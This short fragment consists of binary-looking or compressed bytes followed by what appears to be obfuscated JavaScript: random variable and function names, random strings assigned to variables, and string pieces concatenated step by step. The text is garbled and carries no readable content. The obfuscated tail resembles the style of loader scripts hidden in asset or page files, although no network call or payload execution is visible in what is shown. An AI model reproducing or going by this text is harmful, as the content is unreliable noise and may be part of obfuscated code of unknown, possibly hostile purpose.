D?~x*oy}Y8y+Ecv1Qi*}N}Mt}$A,Ho}"qe~y$IoS$K$Spx5$PoS~Nc$M$U$B_\n%kLoF&x01]J)~kNC]U"}l]mua|`)~M\rwXEScpv~5z.c+SGBt qKY`/|N}lE(}zabqB@~59o&~nq/+$/q|?T\ry #^z.N#BD~i#$.t$0yO+3S%$X##$%zH#(uJ#a8Ko/W{(vX$Ko0s(#*:C1>1U#@58L0sU~QIE~(#>~bKMz)I5Jp{6uTK-	#R#S#T#U#V#W#X#Y#Z#[#\\#]#^#_#`#a#b#c#d#e#f#g#h#i#j#k#l#i\r#o#p#q#r#s#t#u#v#w#x#y#z#{#|#}#~#"zab"""""""""	"\n"""\r""""""""""""""""""" "!"""#"$"%"&"\'"(")"*"+"#m"."/"0"1"2"3"4"5"6"7"8#a';amVB4loJ2B15a      ='hkeOOHOPMoyIdgaOBkhLiROOOjcUtBqOnNrpNVYYrOQgwtHDY';x3raxDT1X='p31Wjyi1J1RK1';cquWY5oHI3ygWqg8    (ut84Kew);ygWqg8cquWY5oHI3  (kvpF1);s6t20  (kvpF1);q90f3t9Ro+=  'TohqvLQIHkOkVFOHadmGfdOOOeJEtxXpUbwXRFgiKLTBcLsDfmxOfNeesdOOrOgijOpTkvOSXWIOVshxyOnLsViCqLPaCgHQMWVObsLUb';tC2K7L+=  'yNjbWANJ6Pc';
